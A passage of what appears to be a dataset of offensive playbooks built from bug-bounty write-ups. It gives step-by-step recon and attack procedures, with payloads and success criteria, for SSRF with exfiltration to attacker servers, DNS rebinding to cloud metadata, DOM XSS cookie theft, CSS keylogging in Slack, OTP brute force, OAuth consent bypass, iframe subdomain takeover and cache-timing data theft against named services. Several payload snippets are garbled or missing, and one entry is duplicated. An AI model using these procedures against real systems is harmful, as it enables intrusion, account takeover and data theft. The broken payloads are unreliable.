Step 2: If `Access-Control-Allow-Origin: *` is present and `Access-Control-Allow-Credentials` is absent or `false`, attempt to fetch the same URL using JavaScript with `{credentials: "include"}`. If the response content differs from an unauthenticated fetch, this indicates sensitive, authenticated data might be accessible.
Step 3: Construct a minimal HTML page with JavaScript that attempts to fetch the target URL using `fetch(url, {cache: 'force-cache'})`.
Step 4: Host this HTML page on a different origin (e.g., a simple HTTP server on your own machine).
attack_steps: Step 1: On the attacker-controlled HTML page, trigger the JavaScript function to fetch the target URL with the `cache: 'force-cache'` option. The attacker's browser (acting as the victim) will make a request to the target.

Step 2: If the target application responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: false`, and the browser has a cached version of the resource that was previously fetched *with* credentials, the browser will return the cached, authenticated version of the resource to the JavaScript on the attacker's page.
Step 3: The JavaScript on the attacker's page parses the HTML response and extracts the sensitive information (e.g., from a textarea element).
Step 4: The extracted sensitive information is then displayed on the attacker's page or sent to an attacker-controlled server.
tools_recommended: Basic HTTP server (e.g., Python's `http.server` module) to host the malicious HTML page.
Browser developer tools to observe network requests and responses.
A simple HTML file with the provided JavaScript payload.
success_indicators: The attacker's HTML page displays sensitive information that was only supposed to be accessible to authenticated users.

The response obtained via `fetch(url, {cache: 'force-cache'})` contains authenticated data, even though the request itself was initiated from a different origin and potentially without explicit credentials in the header (relying on the cache).
failure_indicators: The attacker's HTML page displays default or unauthenticated content from the target URL.
The browser makes a new request without credentials when `cache: 'force-cache'` is used, indicating the cache is not being poisoned as expected.
A 403 Forbidden or CORS-related error is observed in the browser console.

playbooks.impact: An attacker can bypass authentication controls and exfiltrate sensitive user data from a web application by exploiting a vulnerability in the browser's cache mechanism when handling CORS requests with `Access-Control-Allow-Origin: *`.
playbooks.key_lesson: When a web application returns `Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true`, always test for browser cache poisoning vulnerabilities by using `fetch` with `cache: 'force-cache'` to attempt to retrieve authenticated resources.

meta.title: Taking over Facebook Page Tabs

tech_stack_fingerprints: Page tabs loading external content in iframes

trigger_conditions.when_to_apply: When a Facebook Page tab loads content from a third-party domain via an iframe, and that third-party domain or subdomain is either non-existent, expired, or controllable by an attacker.
prerequisites: Attacker can identify Facebook pages with tabs that iframe external content.
The external domain/subdomain used by the tab is not actively controlled or registered by the legitimate page owner.
applicability_signals: Facebook Page tab displays an error page (e.g., Heroku error, page not found).
The iframe source URL points to a domain that can be verified as unregistered, expired, or registrable (e.g., checking domain availability).
The iframe source URL points to a subdomain that returns a 'does not exist' error.
skip_if: The iframe source URL points to a well-known, actively maintained service where subdomain hijacking is unlikely (e.g., a valid livestream.com URL that is properly managed).
The domain is clearly owned and actively serving content, and there's no indication of expirations or misconfigurations.

recon_steps: Step 1: Browse various Facebook Pages (official pages, popular pages, etc.) and inspect the source code of their tabs to identify iframes and their `src` attributes.
Step 2: For each identified iframe `src` URL, visit the URL directly in the browser. Check for any error messages or 'page not found' type responses.

Step 3: If an error is observed, use domain lookup tools (e.g., `dig`, online WHOIS checkers, GoDaddy) to check the status of the domain and its subdomains. Check if the domain is for sale or if subdomains are unused.
attack_steps: Step 1: If a target domain/subdomain is found to be registrable or available for purchase (e.g., `immense-atoll-4159.herokuapp.com` in the writeup), register an account on the hosting platform (e.g., Heroku) and create a new project with the same name.
Step 2: Deploy a simple web application (e.g., a basic HTML page or a Node.js script) to the newly created project/subdomain.
Step 3: Revisit the Facebook Page tab that was observed to be broken. The tab should now load the attacker-controlled content within the iframe.

Step 4 (for Livestream/Vimeo example): If the issue is a username that exists but the `index.php` suffix prevents proper content display, attempt to create an account with the exact username on the streaming platform. If successful, the attacker's content will be served when that username is accessed directly, and potentially when framed.
Step 5 (for domain sale example): Purchase the domain name if it's available for sale and can be used to host content. Configure DNS to point to a web server controlled by the attacker.
payloads_or_patterns: Example of an iframe `src`: `http://<attacker_controlled_subdomain>.<hosting_platform>.com/`, `https://www.webuzzapps.com/webuzzapp/<app_id>/tab` (where webuzzapps.com is for sale)

Simple HTML payload for iframe content: `

Owned

`
tools_recommended: Browser Developer Tools (Inspect Element, View Source)
Online domain registrars (e.g., GoDaddy, Namecheap)
WHOIS lookup tools (`dig`, `whois` command, online services)
Heroku CLI or similar platform deployment tools
Simple web server setup (e.g., Python's `http.server`, Node.js Express)
success_indicators: The previously broken Facebook Page tab now displays the attacker's custom HTML content or JavaScript execution.
JavaScript code deployed by the attacker executes within the iframe's context (e.g., `alert(document.domain)` pops up).
For the livestream.com example, visiting `livestream.com/<attacker_username>` displays attacker's content.
failure_indicators: The tab continues to show an error page, or the attacker's content does not load.
The target domain/subdomain cannot be registered or controlled (e.g., actively used by a legitimate service, WAF blocks attempts to register).
Facebook implements protections that prevent third-party iframes from executing arbitrary JavaScript or redirecting users in a malicious manner.

playbooks.impact: An attacker can take over Facebook Page tabs by controlling the third-party domains or subdomains they load. This allows the attacker to serve arbitrary HTML and JavaScript within the iframe context of a trusted Facebook Page, potentially leading to phishing attacks, credential harvesting, misleading information, or defacement.
playbooks.key_lesson: Continuously monitor third-party domains and subdomains embedded in iframes on Facebook Page tabs for availability, expiration, or misconfigurations that can be exploited for account takeover or content injection.

meta.title: Blind SSRF due to Sentry Misconfiguration

tech_stack_fingerprints: Presence of Sentry error reporting in requests
Referral to a Hackerone Report mentioning Sentry

trigger_conditions.when_to_apply: This technique is applicable when a web application uses Sentry for error reporting and the 'Scrap Source Code' feature is enabled, making the 'filename' parameter vulnerable to SSRF.
prerequisites: Target application uses Sentry for error reporting.
The 'Scrap Source Code' feature in Sentry is enabled.
applicability_signals: Sentry keywords found in HTTP requests/responses during reconnaissance.
Existence of a 'filename' parameter in Sentry-related requests.
skip_if: No Sentry-related requests or parameters are observed.
Target does not appear to be using Sentry for error reporting.

recon_steps: Step 1: Intercept all HTTP traffic using Burp Suite.
Step 2: Filter traffic for 'sentry' keywords to identify relevant requests and responses.
Step 3: Analyze identified Sentry requests for the presence of a 'filename' parameter.
attack_steps: Step 1: Locate a Sentry request containing the 'filename' parameter.
Step 2: Modify the value of the 'filename' parameter to point to an attacker-controlled server (e.g., a localhost server with a unique identifier or a Burp Collaborator instance).
Step 3: Send the modified request and monitor the attacker-controlled server for incoming callbacks.
tools_recommended: Burp Suite: For intercepting and modifying requests, and for using Burp Collaborator for callback detection.
success_indicators: A successful callback is received on the attacker-controlled server or Burp Collaborator.
The callback contains data indicating that the server attempted to fetch the content from the specified URL.
failure_indicators: No callback is received after sending the request.
The application returns an error or a different response indicating the request was not processed as expected.
If no 'filename' parameter is found, reassess the target for other Sentry-related vulnerabilities or other attack vectors.

playbooks.impact: Attacker can trigger blind Server Side Request Forgery (SSRF) by controlling the 'filename' parameter, potentially leading to internal network reconnaissance, interaction with internal services, or exfiltration of sensitive data if the server fetches non-public resources.
playbooks.key_lesson: Always investigate Sentry configurations for potential misconfigurations, especially when the 'Scrap Source Code' feature is enabled, as it can lead to blind SSRF vulnerabilities via the 'filename' parameter.

meta.title: Mass XS-Search using Cache Attack

target_profile.technology: Google Products (My Activity, Gmail, Google Search, Google Books, Google Bookmarks, Google Keep, Google Contacts, YouTube)

trigger_conditions.when_to_apply: When a user visits a malicious website while logged into Google services, and specific Google resources are loaded based on search queries or user activity, which can be detected via cache timing attacks.
prerequisites: User must be logged into their Google account.
Attacker must be able to host a malicious website.
The vulnerable Google resource must be loaded by the browser when the malicious page is visited.
applicability_signals: Endpoints that load different resources based on user data or search queries.
Endpoints that use external assets (e.g., images, scripts) that can be fingerprinted.
The presence of search functionality within Google products that can be manipulated to return specific results.
skip_if: If the target service doesn't load external resources dynamically based on user input or activity.
If the target service has strong cache control mechanisms that prevent timing side-channels.
If the user is not logged in to any Google services.

recon_steps: Step 1: Identify Google services that load dynamic resources based on user input or search queries.
Step 2: Inspect network traffic when performing searches or interacting with these services to identify unique URLs or resources loaded.
Step 3: Examine the PoC (https://terjanq.github.io/Bug-Bounty/Google/cache-attack-06jd2d2mz2r0/poc.html) to understand which specific Google resources are being abused for each service.
attack_steps: Step 1: Host a malicious HTML page containing an `
Step 2: The malicious page will attempt to load multiple Google resource URLs, each representing a potential piece of sensitive data (e.g., a specific character of a search history entry).

Step 3: The malicious page measures the load time of these resources. Faster load times indicate that the resource was likely already in the browser's cache, implying that the corresponding sensitive data was present or accessed recently.
Step 4: By performing a binary search or a targeted search (e.g., character by character), the attacker can reconstruct sensitive information.
payloads_or_patterns: The PoC HTML page contains the full logic for timing and analysis.
tools_recommended: Burp Suite: To proxy traffic and analyze network requests/responses.
Custom HTML/JavaScript: To host the malicious page and implement the cache timing logic.
success_indicators: Observable timing differences in resource load times, indicating that the resource was likely cached.
Reconstruction of sensitive data (e.g., search history entries, email content snippets, book titles) based on successful timing measurements.
failure_indicators: No significant timing differences observed, suggesting the cache timing attack is not effective.
WAF blocking requests to Google resources (unlikely for legitimate Google domains).
Google services not loading external resources in a way that is susceptible to this attack. Pivot to other XS-Search techniques if available.

playbooks.impact: Attacker can retrieve sensitive user information such as search history, visited URLs, exact timeframes of activities, private emails, tokens, credit card numbers, phone numbers, contacts, private notes, bookmarked websites, and private book collections without direct access to the user's account.
playbooks.key_lesson: Always test for XS-Search vulnerabilities using cache timing attacks on any web application that loads external resources dynamically, especially when user-specific data influences the loaded resources.

meta.title: How I accidentally took down GitHub Actions

trigger_conditions.when_to_apply: When GitHub Actions is configured to use a Docker container via `actions/docker/cli` or a similar mechanism that relies on commit shorthashes for versioning.
prerequisites: Attacker can push to a repository used by GitHub Actions for its Docker images (or influence the commit history of such a repo).
applicability_signals: GitHub Actions workflow file specifies `uses = "<repo>/<path>@<short_commit_hash>"
The specified `<repo>` is a GitHub repository.
skip_if: GitHub Actions exclusively uses full commit hashes or tags for versioning Docker images.
The target repository has a very small number of commits, making hash collisions extremely unlikely and difficult to force.

recon_steps: Step 1: Identify GitHub Actions workflows in a target repository that use Docker containers and specify a `uses` directive with a commit hash (e.g., `actions/docker/cli@76ff57a`).
Step 2: Examine the referenced repository (e.g., `actions/docker`) and note the commit hash used. Determine if it is a shorthash (7 characters).
attack_steps: Step 1: Clone the target Docker repository (e.g., `actions/docker`).

Step 2: Use a tool or manual Git commands to create new commits until one is generated that shares the same 7-character shorthash as the original commit referenced in the workflow file. This can be achieved by repeatedly amending the commit message.
Step 3: Push this new commit (with the colliding shorthash) to the target Docker repository.
Step 4: Trigger the GitHub Actions workflow. The runner will now pull the repository at the colliding commit, potentially executing different code than intended.
payloads_or_patterns: Git commands to amend commit message: `git commit --amend -m "New message to alter hash"`
Concept: Create a new commit with the same shorthash as an existing commit referenced in a GitHub Action.
tools_recommended: Git: For cloning, committing, and amending.
Custom script/tool: To automate the process of generating Git commits with specific shorthashes.
success_indicators: GitHub Actions workflow executes code from the attacker-controlled commit instead of the intended version.
Observed unexpected behavior or output from the GitHub Actions job.
failure_indicators: GitHub Actions workflow fails to build, indicating a strict validation of commit hashes. Pivot: Look for other versioning mechanisms that might be vulnerable.
The shorthash collision cannot be achieved due to repository size or GitHub's internal checks. Pivot: Investigate other components of GitHub Actions for vulnerabilities.

playbooks.impact: Denial of Service (DoS) of GitHub Actions for any repository relying on the vulnerable Docker image version. The attacker can force the execution of arbitrary code within the CI/CD pipeline by causing a commit hash collision.
playbooks.key_lesson: Never rely on Git commit shorthashes for critical versioning or security controls; always use full commit hashes or immutable tags.

meta.title: Keylogging users via Slack themes

affected_components: Input fields (e.g., message composer, channel name input)

trigger_conditions.when_to_apply: When a user has the ability to customize their Slack theme, and the attacker can convince the victim to apply or preview a malicious theme.
prerequisites: The target user must be able to apply or preview custom Slack themes.
The attacker must be able to host a malicious server to receive exfiltrated data.
applicability_signals: Presence of a custom theme editor in the Slack client.
Slack client allows custom CSS to be injected via theme settings.
Input fields within Slack are rendered with standard HTML elements that are susceptible to CSS attribute selectors.
skip_if: The custom theme functionality is disabled or severely restricted.
Slack filters or sanitizes CSS in custom themes, preventing the use of attribute selectors for background-image loading.

recon_steps: Step 1: Examine Slack's custom theme settings to identify the structure and limitations of CSS injection.
Step 2: Identify different input types and their corresponding attributes within the Slack client (e.g., message input, channel search/creation).
attack_steps: Step 1: Craft a malicious CSS payload that uses attribute selectors to target input fields based on their current value.
Step 2: Configure the CSS payload to trigger a request to an attacker-controlled server (e.g., via `background-image: url(...)`) when a specific character is typed into an input field.
Step 3: Construct a malicious Slack theme containing the crafted CSS.
Step 4: Find a way to deliver the malicious theme to the target user (e.g., sharing it directly, tricking them into copying/pasting it, or if a 1-click install was possible, exploiting that).
Step 5: Monitor the attacker-controlled server for incoming requests, which will log the characters typed by the victim.
tools_recommended: Burp Suite or similar proxy for monitoring network requests.
A simple web server (e.g., Python http.server) to log incoming requests from the victim's browser.
success_indicators: Incoming HTTP requests to the attacker-controlled server, where the URL path corresponds to the characters typed by the victim into Slack input fields.
Successful logging of typed characters from the victim's Slack session.
failure_indicators: No requests are received on the attacker's server after the victim interacts with Slack inputs.
Slack's theme rendering fails or shows visual glitches, indicating potential CSS sanitization or parsing errors.
Errors in the browser console indicating invalid CSS or failed resource loading.

playbooks.impact: Attacker can keylog user input from Slack messages and channel searches. This allows for the exfiltration of sensitive information, credentials, private conversations, and other data typed by the user within the Slack application.
playbooks.key_lesson: Always test the sanitization of CSS in user-controllable theme settings, especially for CSS properties that can trigger external network requests like `background-image`.

meta.title: My First SSRF Using DNS Rebinding

affected_components: Any service that fetches external URLs and performs IP allowlist/denylist checks without proper validation
tech_stack_fingerprints: Backend code that explicitly checks resolved IP addresses against a banlist before making an HTTP request

trigger_conditions.when_to_apply: When a web application fetches an external URL, resolves its IP, and checks it against a banlist before making the request, and the application is vulnerable to DNS rebinding.
prerequisites: Attacker can control the DNS records for a domain they own.
The target application allows specifying an external URL as input.
The target application has a banlist for IP addresses (e.g., localhost, internal IPs).
The target application's DNS resolution and request execution are not atomic, allowing for a time-of-check to time-of-use vulnerability.
applicability_signals: Target accepts URLs as parameters for fetching content.
Target's responses indicate a ban on internal IP addresses (e.g., 'request blocked').
The application's source code (if available) reveals IP address checking logic before making requests.
skip_if: The target application uses a Web Application Firewall (WAF) that blocks requests to unusual IP addresses or domains.
The target application strictly enforces same-origin policy for requests.
The target application uses IP whitelisting for all external requests.

recon_steps: Step 1: Identify input points in the target application that accept external URLs for processing.
Step 2: Attempt to provide internal IP addresses (e.g., 127.0.0.1, 169.254.169.254) as the URL to observe error messages or denial responses.
attack_steps: Step 1: Set up a DNS server that can serve controlled DNS records for a domain you own. Configure it to initially resolve your domain to a public IP address.
Step 2: Configure the DNS server to rapidly switch the resolved IP address for your domain to a target internal IP address (e.g., 127.0.0.1 or AWS metadata IP 169.254.169.254). Set a very low TTL.
Step 3: Submit the URL pointing to your controlled domain (e.g., http://<attacker_controlled_domain>) to the vulnerable input point in the target application.
Step 4: Monitor the DNS server logs for incoming requests from the target application.

Step 5: If the initial request with the public IP is allowed by the banlist, the DNS server quickly switches the IP to the internal one. The target application then makes a request to this internal IP.
Step 6: If the target application is vulnerable, it will fetch data from the internal IP (e.g., AWS metadata, internal services) and return it in the response.
tools_recommended: Custom DNS server (e.g., using dnspython, PowerDNS)
Burp Suite Intruder (to send many requests rapidly)
DNS rebinding service (e.g., https://lock.cmpxchg8b.com/rebinder.html - though custom is better for control)
success_indicators: Receiving a response from the target application that contains data from an internal IP address (e.g., AWS metadata, internal service banners, error pages from localhost).
The length of the response differs significantly from expected responses for a normal external URL.
Receiving a response with AWS credentials or other sensitive information from the 169.254.169.254 IP.
failure_indicators: All requests result in the 'request blocked' message, indicating the IP check is too robust or the rebinding is not successful.
Responses always come from the initial public IP address, suggesting the DNS rebinding failed.
No observable change in response even after multiple attempts with different internal IPs.

playbooks.impact: The attacker can bypass network restrictions and access internal resources or sensitive metadata that should not be exposed externally. This can lead to the retrieval of AWS credentials, internal API endpoints, or other sensitive data.
playbooks.key_lesson: When an application fetches external URLs and performs IP filtering, consider DNS rebinding as a technique to bypass these restrictions by making the IP address appear malicious only after the initial check.

meta.title: DOM-Based XSS

trigger_conditions.when_to_apply: When a web application's client-side JavaScript directly uses URL parameters (e.g., from document.location.search) in dangerous DOM manipulation functions like innerHTML or document.write without proper sanitization.
prerequisites: Target application has a public bug bounty program.
Target application has a search feature or similar functionality that reflects user input from the URL.
applicability_signals: URL parameters are visible in the browser's address bar.
Observing JavaScript code that reads from `document.location.search` or `URLSearchParams` and writes to `innerHTML` or `document.write`.
Parameters like 'q' or 'lang' are present in the URL.
skip_if: Client-side JavaScript properly sanitizes or encodes all user-controlled input before using it in DOM manipulation.
A Web Application Firewall (WAF) consistently blocks common XSS payloads before they reach the client-side script.

recon_steps: Step 1: Navigate to the target documentation portal and identify any search functionality or URL parameters that reflect user input.
Step 2: Analyze the JavaScript source files for the application, looking for sinks like `innerHTML`, `document.write`, `eval`, or other unsafe DOM manipulation methods.

Step 3: Correlate sinks with sources of user-controlled data, such as `document.location.search`, `window.location.href`, `document.referrer`, `window.name`, or URL parameters obtained via `URLSearchParams`.
attack_steps: Step 1: Construct a URL with a simple test payload in a vulnerable parameter, e.g., `https://docs.redacted.com/search?q=&lang=en`.
Step 2: Observe if the alert box pops up, indicating successful DOM XSS.

Step 3: If a basic payload fails, investigate for client-side filtering. Attempt bypasses by encoding characters or using alternative HTML tags and event handlers (e.g., `<svg onload=alert(document.domain)>`, `<details open ontoggle=alert(document.domain)>`).
Step 4: Once a bypass is successful, craft a payload to demonstrate impact, such as stealing cookies via `fetch` or creating a phishing form.
payloads_or_patterns:
Phishing Payload: `document.body.innerHTML = '

Session Expired

'`
tools_recommended: Browser Developer Tools: Inspect JavaScript, analyze network requests, and view DOM.
Burp Suite/OWASP ZAP: Intercept and modify requests, automate payload testing.
Online URL Encoder/Decoder: For URL encoding payloads.
success_indicators: An `alert()` box appears in the browser.
An HTTP request is received at an attacker-controlled server (e.g., Burp Collaborator, custom listener) containing sensitive information like `document.cookie` or form submissions.
The page content is modified by the payload (e.g., a phishing form appears).
failure_indicators: No `alert()` box appears, and no requests are sent to the attacker server. This might indicate a WAF blocking the payload or that the JavaScript sink is not vulnerable. Pivot to testing other parameters or JavaScript code paths.
Page breaks or displays errors. This could mean the payload syntax is incorrect or not properly handled by the DOM manipulation. Try simpler payloads or different tags.

playbooks.impact: Attacker can steal sensitive user information, such as session cookies, leading to session hijacking. Attacker can also deface the website or present malicious content like phishing forms to the user.
playbooks.key_lesson: Always investigate how user-controlled data from URL parameters is handled by client-side JavaScript, especially looking for direct injection into `innerHTML` or `document.write` without proper sanitization or encoding.

meta.title: BugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!!

trigger_conditions.when_to_apply: When a target implements OTP-based 2FA and does not enforce rate limiting or lockouts on repeated failed OTP attempts.
prerequisites: Attacker has obtained a valid user session for an account that requires OTP verification.
Attacker can intercept HTTP requests between the client and server.
applicability_signals: The login flow proceeds to an OTP verification screen after initial credential submission.
Intercepting the OTP verification request shows a predictable format for the OTP (e.g., numeric).
skip_if: The server imposes a strict rate limit on OTP verification attempts (e.g., blocking after 3-5 failed attempts).
A new OTP is generated and required for each subsequent verification attempt, making brute-force infeasible without a way to trigger new OTPs.

recon_steps: Step 1: Log in to a target account with valid credentials to reach the OTP verification step.
Step 2: Intercept the HTTP request made when submitting the OTP using a proxy like Burp Suite.
attack_steps: Step 1: Identify the parameter that holds the OTP in the intercepted request (e.g., 'otp', 'verificationCode').
Step 2: Send the intercepted request to Burp Suite's Intruder module.
Step 3: Mark the OTP parameter as the payload position.
Step 4: Configure the Intruder payload type to 'Numbers'.
Step 5: Set the payload options to generate numbers from 0000 to 9999 (or the observed range of OTPs).
Step 6: Start the attack and monitor the response lengths or status codes for any anomalies.
Step 7: Identify the response that indicates a successful OTP verification (e.g., a significantly different response length, a success status code, or the presence of an authentication token).
tools_recommended: Burp Suite Intruder: Configure for 'Numbers' payload type, range 0000-9999, and monitor response lengths.
success_indicators: A response with a different length compared to failed attempts (e.g., 2250 vs 617 in the writeup).
A successful HTTP status code (e.g., 200 OK) accompanied by an authentication token or a redirect to a logged-in page.
The presence of a login token in the response.
failure_indicators: All responses show consistent lengths or status codes indicating failure for all OTP attempts.
The target server responds with error messages like 'Invalid OTP' for all attempts.
A WAF blocks the requests due to too many attempts.

playbooks.impact: Attacker can bypass two-factor authentication for any user, gaining unauthorized access to their accounts and any associated data or functionality.
playbooks.key_lesson: Always test OTP verification endpoints for brute-force vulnerabilities by checking for the absence of rate limiting and implementing automated attacks with appropriate payload ranges.

meta.title: How I Hacked Dutch Government in 5 Minutes? Twitter Account Takeover

affected_components: Twitter accounts associated with Dutch government/embassies
tech_stack_fingerprints: Mentions of Twitter accounts in government-linked websites

trigger_conditions.when_to_apply: When a website linked to official government social media accounts displays missing or inactive Twitter accounts.
prerequisites: Discovery of a government-linked website that lists social media accounts.
Identification of unused Twitter usernames associated with the government.
applicability_signals: A government website with a directory of social media links.
Observing that some listed Twitter accounts do not exist.
skip_if: All listed Twitter accounts are active and registered.
The linked website does not exist or is not accessible.

recon_steps: Step 1: Identify government-linked websites that aggregate social media accounts of ambassadors and embassies.
Step 2: Browse the listed social media accounts and check the existence of each Twitter profile by visiting the expected URL (e.g., twitter.com/username).
attack_steps: Step 1: If a Twitter username is found to be unregistered (e.g., results in a 'This account does not exist' page or similar), attempt to register that username on Twitter.
Step 2: Once the username is registered, send an email to the relevant government cybersecurity contact (e.g., [email protected]) to report the vulnerability and claim the hijacked account.
Step 3: Await confirmation and resolution from the government's security team.
tools_recommended: Web browser for checking account existence and registration
Email client for reporting the vulnerability
success_indicators: Confirmation email from the NCSC stating the vulnerability is confirmed.
Receipt of swag as a reward for reporting the vulnerability.
The Twitter account is no longer available for registration under the reclaimed username.
failure_indicators: The Twitter username is already registered by someone else.
The government security team does not respond or denies the vulnerability.
The linked website does not contain information about social media accounts.

playbooks.impact: Takeover of official Twitter accounts belonging to the Dutch government and its ambassadors/embassies, allowing potential for impersonation, disinformation, or reputational damage.
playbooks.key_lesson: When identifying government-linked social media directories, check the existence of all listed social media accounts and attempt to register any unused usernames to prevent account takeovers.

meta.title: BugBounty | A Simple SSRF

trigger_conditions.when_to_apply: When a web application previews URLs submitted by users, and performs client-side fetching of URL content (like favicons or titles) using JavaScript, which can be leveraged for SSRF.
prerequisites: User account and ability to use the chat interface.
applicability_signals: Input field accepts URLs.
Application attempts to preview URL content (e.g., shows title, favicon).
Client-side JavaScript (XMLHttpRequest) is used for fetching URL previews.
skip_if: All requests to internal or localhost IPs are blocked by a firewall or WAF.
The application explicitly validates URLs against an allowlist before fetching.
JavaScript is disabled in the client's browser.

recon_steps: Step 1: Identify the chat interface and the URL preview functionality.
Step 2: Submit various URLs (external, internal IPs like 127.0.0.1, localhost) to observe the application's response and identify any filtering or blocking mechanisms.
attack_steps: Step 1: Construct an HTML payload containing JavaScript that uses `XMLHttpRequest` to fetch content from an internal IP address (e.g., `http://<INTERNAL_IP>`).
Step 2: Submit this HTML payload as a URL to the chat interface.
Step 3: Observe the response. If the `XMLHttpRequest` successfully fetches content from the internal IP, the response might contain that content or its length, indicating SSRF.

Step 4: To exfiltrate data, construct a second HTML payload that fetches content from an internal resource and then uses `POST` or `GET` to send the fetched content to an attacker-controlled server (e.g., a simple PHP script that logs POST data).
Step 5: Submit the exfiltration payload URL to the chat interface.
Step 6: Check the attacker-controlled server (e.g., `save.txt` file) for the exfiltrated data. Alternatively, use Burp Collaborator for blind SSRF detection.
Step 7: If Same Origin Policy is an issue, attempt DNS rebinding techniques to bypass it, as described in the linked resources.
tools_recommended: Burp Suite: To intercept requests, analyze responses, and host the attacker-controlled server or use Burp Collaborator for blind SSRF detection.
Custom script/server: To receive exfiltrated data.
success_indicators: Receiving the response content from an internal IP address in the attacker's browser or logged on the attacker-controlled server.
The `innerHTML` showing a length greater than 0 for fetched internal content.
Successful logging of data on the `log.php` script or in Burp Collaborator.
failure_indicators: The `XMLHttpRequest` call fails or returns an error.
The `innerHTML` remains 'Failed' or shows a length of 0.
No data is received on the attacker's server.
A 403 Forbidden or similar error response from the target server when attempting to access internal resources.
If SOP is enforced and not bypassed, the script will not be able to access content from different origins (though this is described as bypassable).

playbooks.impact: Attacker can read arbitrary files and access any resource on the internal network accessible by the web application's server, leading to data breaches and potential further compromise.
playbooks.key_lesson: Always validate and sanitize URLs provided by users for preview or fetching functionality, and be aware of client-side JavaScript's ability to perform SSRF if not properly restricted.

meta.title: Bypassing GitHub's OAuth flow

tech_stack_fingerprints: Rails web framework (inferred from writeup description of router behavior)

trigger_conditions.when_to_apply: When the target application's OAuth authorization endpoint accepts both GET and POST requests and uses the request method to differentiate behavior, and the underlying web framework (like Rails) misinterprets HEAD requests as non-GET.
prerequisites: Attacker has an authenticated GitHub account.
Attacker can initiate the OAuth flow with a third-party application.
applicability_signals: The `/login/oauth/authorize` endpoint responds to GET requests with an HTML authorization page.
The `/login/oauth/authorize` endpoint accepts POST requests to grant authorization.
The controller code uses `request.get?` to determine authorization behavior.
skip_if: The `/login/oauth/authorize` endpoint does not respond to POST requests.
The application correctly handles HEAD requests as GET requests in the controller logic.

recon_steps: Step 1: Observe the `/login/oauth/authorize` endpoint's response to a GET request with standard OAuth parameters to confirm it serves the authorization page.

Step 2: Attempt a POST request to `/login/oauth/authorize` with valid parameters (as if an authorized user clicked the button) to see if it bypasses the normal authorization flow (though CSRF protection might prevent this directly).
attack_steps: Step 1: Initiate the OAuth flow by directing a user to `/login/oauth/authorize` with the required query parameters (client_id, redirect_uri, scope).
Step 2: Instead of clicking the 'Authorize' button (which performs a POST), send a HEAD request to the same `/login/oauth/authorize` endpoint, ensuring it includes the necessary OAuth parameters.
Step 3: The server, receiving the HEAD request, will route it to the same controller as a GET request. The controller's `request.get?` check will return `false` because it's a HEAD request.

Step 4: The controller logic will then execute the `else` block (grant permissions), and since it's a HEAD request, it will send back only headers, effectively granting authorization to the attacker's configured `redirect_uri` without user consent.
tools_recommended: curl: To manually craft and send HEAD requests.
Burp Suite: To intercept and modify requests, especially to analyze response headers and parameters.
success_indicators: The attacker's `redirect_uri` receives an authorization code without the user explicitly approving the authorization.
The response to the HEAD request contains headers related to a successful authorization grant (e.g., `Location` header redirecting to the `redirect_uri`).
failure_indicators: Receiving a 405 Method Not Allowed or a response indicating the endpoint doesn't support HEAD.
The application still performs a GET-like behavior or redirects to an error page instead of granting authorization.

playbooks.impact: An attacker can gain unauthorized access to a user's GitHub data by tricking them into initiating the OAuth flow and then exploiting the HEAD request vulnerability to obtain an authorization code, which can then be exchanged for an access token.
playbooks.key_lesson: When an endpoint's behavior is determined by HTTP method (e.g., GET vs. POST), always test other less common methods like HEAD, as framework-level request method checks might not align with application-level checks.

meta.title: BugBounty | A Simple SSRF

tech_stack_fingerprints: The application renders a preview of submitted URLs, showing a title and favicon.

trigger_conditions.when_to_apply: When a web application accepts URLs and displays a preview, especially in a chat or messaging feature, as it may be fetching external resources without proper validation.
prerequisites: The user must be able to send a URL within the chat interface.
applicability_signals: The chat interface displays a preview of submitted URLs (title, favicon).
Requests are made from the server to the submitted URL.
skip_if: The application explicitly blocks requests to localhost, internal IP ranges, or specific protocols like file://.
All external requests made by the server are logged or filtered, preventing successful exfiltration or interaction.

recon_steps: Step 1: Submit various URLs to the chat interface to observe the preview functionality.
Step 2: Use an IP address associated with a controlled server (e.g., Burp Collaborator) to check for incoming requests. Analyze the User-Agent header to confirm server-side fetching.
attack_steps: Step 1: Attempt to access common internal IP addresses and loopback interfaces (e.g., http://127.0.0.1, https://127.0.0.1, http://169.254.169.254).
Step 2: If direct access to internal IPs fails, perform subdomain brute-forcing and use asset discovery tools to find potential internal IPs or hostnames.
Step 3: Craft HTML payloads containing JavaScript to perform `XMLHttpRequest` GET requests to internal resources.
Step 4: If the Same Origin Policy (SOP) prevents direct data access, implement a DNS rebinding attack to bypass SOP and retrieve data from internal servers.
Step 5: Create a simple PHP script on a controlled server to receive and store sensitive data sent via POST requests from the exploited client-side JavaScript.
Step 6: Construct an HTML file that uses JavaScript to fetch internal content via GET and then POST it to the controlled PHP script, using `escape()` for URL encoding if necessary.
Step 7: Submit the crafted HTML file (or a URL pointing to it if the application supports rendering HTML) to the chat interface.
Step 8: Check the `save.txt` file on the controlled server or the Burp Collaborator client for exfiltrated data.
tools_recommended: Burp Suite (or OWASP ZAP) for intercepting requests and analyzing responses, Burp Collaborator (or similar) for detecting SSRF callbacks.
Subdomain enumeration tools (e.g., subfinder, amass) to discover internal hostnames or IPs.
Asset discovery tools to map the internal network.
success_indicators: The response from the chat preview contains content from an internal resource (e.g., HTML of an internal web page, plain text from a file).
Data appears in the `save.txt` file on the controlled server or is received by Burp Collaborator, indicating successful exfiltration.
failure_indicators: 403 Forbidden or connection refused errors when trying to access internal IPs. Suggestion: Try to find more internal hostnames/IPs via recon or test for other vulnerabilities.

No incoming requests are received on the controlled server when submitting URLs. Suggestion: Verify the server is correctly configured to receive requests and that the target application is indeed fetching the URL server-side.
Content fetched is limited or garbled. Suggestion: Investigate character encoding issues, potential WAFs, or explore DNS rebinding for SOP bypass.

playbooks.impact: Read sensitive data from internal network resources, including configuration files, credentials, or other proprietary information that is not intended to be exposed externally. Ability to interact with internal services.
playbooks.key_lesson: When a web application previews URLs, assume it's making server-side requests and test for SSRF against internal IPs and hostnames. If Same Origin Policy restricts data exfiltration, consider DNS rebinding techniques.

meta.title: Filling in the Blanks: Exploiting Null Byte Buffer Overflow for a $40,000 Bounty

target_profile.technology: Custom web application with C backend

trigger_conditions.when_to_apply: When a web application uses a C backend to process user registration input, and the input processing is susceptible to null byte injection in string handling.
prerequisites: Ability to submit registration requests to the target application.
applicability_signals: The registration endpoint appears to accept email addresses containing URL-encoded null bytes (%00).
